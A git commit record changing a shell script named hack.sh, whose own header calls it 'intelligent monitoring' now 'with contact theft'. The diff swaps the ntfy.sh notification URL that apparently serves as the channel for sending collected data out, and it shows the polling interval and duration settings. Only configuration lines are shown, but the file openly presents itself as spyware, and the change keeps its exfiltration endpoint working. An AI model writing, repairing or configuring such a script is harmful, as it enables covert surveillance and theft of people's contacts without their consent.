5cdd1f7bdca0e84e299bfbc6835e0104071460c1
Hectorr019 <hectorsitoriquelmito@gmail.com>
2025-08-10 01:08:45 -0400

    Update hack.sh

--- hack.sh
+++ hack.sh
@@ -2,7 +2,7 @@
 # Monitoreo Inteligente Mejorado (Ahora con Robo de Contactos)
 
 # ===== CONFIGURACIÓN =====
-NTFY_URL="https://ntfy.sh/ppN9N9N9990"
+NTFY_URL="https://ntfy.sh/jotape09"
 INTERVALO=5  #tiempo entre actualizaciones
 DURACION_MIN=60 # Duración total en minutos
 DEBUG=true
